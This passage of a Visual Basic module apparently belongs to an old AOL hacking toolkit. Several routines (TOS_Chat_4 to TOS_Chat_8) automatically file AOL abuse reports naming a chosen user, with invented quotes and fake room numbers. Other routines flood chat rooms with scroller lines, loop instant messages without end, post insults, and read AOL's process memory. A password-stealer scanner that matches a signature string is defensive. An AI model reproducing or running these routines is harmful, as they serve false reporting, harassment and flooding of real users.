      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
End Sub

Sub TOS_Chat_4(Who$, what$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Timeout 2#
Ao_Click bttn%
Timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
AOLKillWindow reachwin%
End Sub

Sub TOS_Chat_5(Who$, what$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
reachwin% = findchildbytitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
Timeout 3#
Ao_Click fuck8%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Timeout 3#
Ao_Click bttn%
Timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
AOLKillWindow reachwin%
End Sub

Sub TOS_Chat_6(Who$, what$)
Ao_Keyword ("postmaster")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
anal% = findchildbytitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Timeout 2#
Ao_Click bttn%
Timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
AOLKillWindow anal%
End Sub

Sub TOS_Chat_7(Who$, what$)
Ao_Keyword ("guidepager")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
guidewin% = findchildbytitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Timeout 2#
Ao_Click bttn%
Timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
AOLKillWindow guidewin%
End Sub

Sub TOS_Chat_8(Who$, what$)
Ao_Keyword ("aol://4344:1732.TOSnote.13706095.560712263")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswinz% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttns% = FindChildByClass(toswinz%, "_AOL_Icon")
bttns2% = GetNextWindow(bttns%, 2)
Loop Until toswinz% <> 0
Timeout 2#
Ao_Click bttns2%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Notify AOL")
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
AOLKillWindow toswin%
AOLKillWindow anal%
End Sub
Sub BotFood()
'this will give a random saying for a bot
'put this in a timer with interval = 1:
'call BotFood
On Error GoTo hell
LastLine$ = ChatLastLine
If LastLine$ = OldLast$ Then Exit Sub
OldLast$ = LastLine$
whoend = InStr(LastLine$, ":")
Who$ = Left$(LastLine$, whoend - 1)
what$ = Mid$(LastLine$, whoend + 3)
If LCase(what$) = "/food" Then
Num = RandomNumber(10)
Select Case Num
Case 1:
s$ = "You get a hamburger"
Case 2:
s$ = "You get a Cookie"
Case 3:
s$ = "You dont get anything you fat shit!"
Case 4:
s$ = "Stop eating so damn much!"
Case 5:
s$ = "You get ice cream"
Case 6:
s$ = "You get a bagel"
Case 7:
s$ = "You get ALL the food"
Case 8:
s$ = "You get a cracker"
Case 9:
s$ = "You get chinese food"
Case 10:
s$ = "You get a pizza"
End Select
osend$ = Who$ + ", " + s$
SendChat osend$
End If
hell:
End Sub


Sub AddbuddiesToListBox(ListBox As ListBox)
'I was ask how to do it so
'I just added it
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear
budlist% = findchildbytitle(AoLMDI(), "Buddy List Window")

aolhandle = FindChildByClass(budlist%, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub strangeim(StuFF)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call IMKeyword(StuFF, "<body bgcolor=#000000>")
Call IMKeyword(StuFF, "<body bgcolor=#0000FF>")
Call IMKeyword(StuFF, "<body bgcolor=#FF0000>")
Call IMKeyword(StuFF, "<body bgcolor=#00FF00>")
Call IMKeyword(StuFF, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub

Public Sub eightLine(txt As TextBox)
'a simple 8 line scroller
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""

SendChat "" + txt.text + "" & C$ & "" + txt.text + ""

SendChat "" + txt.text + "" & C$ & "" + txt.text + ""

SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 2

End Sub


Public Sub FifteenLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$
Timeout 1.5
End Sub
Public Sub FiveLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$
Timeout 0.3
End Sub




Public Sub SixTeenLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.7
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.7
End Sub





Sub PWS_Scan(flename, txt As TextBox)
'I really don't wanna do this but
'I have been asked about a million
'times how to use this sub with
'dir_list's and shit So here is
'my full code for My PwSd

'Private Sub Dir1_Change()
'File1 = Dir1
'End Sub

'Private Sub Drive1_Change()
'Dir1 = Drive1
    'End Sub

'Private Sub Form_Load()
'StayOnTop Me
'End Sub


'Private Sub Timer1_Timer()
'Note: the timer is set at 1
'Text1.text = Dir1 & File1
'End Sub

'Private Sub Command1_Click()

'PWS_Scan Text1, Text1
'End Sub


'Ok I said full but hey what u expect
'Did u really think I was gonna give u the
'Full code.. If u can't get it from there u
'Shouldn't be proggin
If txt.text = "" Then
MsgBox "You Have To Select A File"
Exit Sub
End If
bwap = "check"
yo = "mail"
nutts = "you've"
nutts2 = "&sent"
heya = bwap & " " & yo & " " & nutts & " " & nutts2
txt.text = LCase(txt.text)
BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
BoldFadeBlack "[Scanning" & flename & "]"
hello = txt.text
Timeout 2
Open hello For Binary As #1
lent = FileLen(hello)

For i = 1 To lent Step 32000
  
  Temp$ = String$(32000, " ")
  Get #1, i, Temp$
  Temp$ = LCase$(Temp$)
  If InStr(Temp$, heya) Then
  Timeout 1
    Close
  Timeout 1
    BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
    BoldFadeRed "·÷^·• RaVaGe  -^-› [pws detected]"
    mb1 = MsgBox(flename & " Is A Password Stealer Do You Wan't To Delete It?", 36, "RaVaGe pws detector")
    Select Case mb1
    Case 6:
    Timeout 1
    BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
   BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws deleted]"
    Kill "" & txt.text
    MsgBox "The Password Stealer Has Been Removed", 16, "RaVaGe pws detector"
    Case 7: Exit Sub
    End Select
    Exit Sub
  End If
  i = i - 50
Next i
Close
Timeout 2.9
MsgBox flename & " Is Not A Password Stealer", 16, "RaVaGe pws detector"
r_Rainbow (flename & " Is Not A Password Stealer")
End Sub
Sub EXE_OPEN(what$)
On Error GoTo 10
X = Shell(what$, 1)
Exit Sub
10:
MsgBox what$ + ", Was not found.", 16, "Error"
Exit Sub
End Sub


Public Sub TenLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
End Sub

Public Sub ThirtyFiveLine(txt As TextBox)
a = String(116, Chr(4))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$
Timeout 0.3
End Sub

Public Sub TwentyFiveLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + ""
Timeout 1.5

End Sub


Public Sub TwentyLine(txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(txt)
C$ = Left(a, d)
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 1.5
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
SendChat "" + txt.text + "" & C$ & "" + txt.text + ""
Timeout 0.3
End Sub

Function ScrambleText2(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Scrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText2 = scrambled$

Exit Function
End Function
Function DescrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Descrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function


Sub Directory_Create(dir)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
MkDir dir
End Sub

Sub Directory_Delete(dir)
'This deletes a directory automatically from your HD
RmDir (dir)
End Sub


Sub File_Delete(File)
'This will delete a file straight from the users HD
Kill (File)
End Sub
Sub File_Open(File)
'This will open a file... whole dir and file name needed
Shell (File)
End Sub
Sub File_ReName(sFromLoc As String, sToLoc As String)
'This will immediately rename a file for you
Name sOldLoc As sNewLoc
End Sub



Sub Window_Hide(hwnd)
'This will hide the window of your choice
X = ShowWindow(hwnd, SW_HIDE)
End Sub



Sub Window_Show(hwnd)
'This will show the window of your choice
X = ShowWindow(hwnd, SW_SHOW)
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub

Sub PhreakyAttention(text)

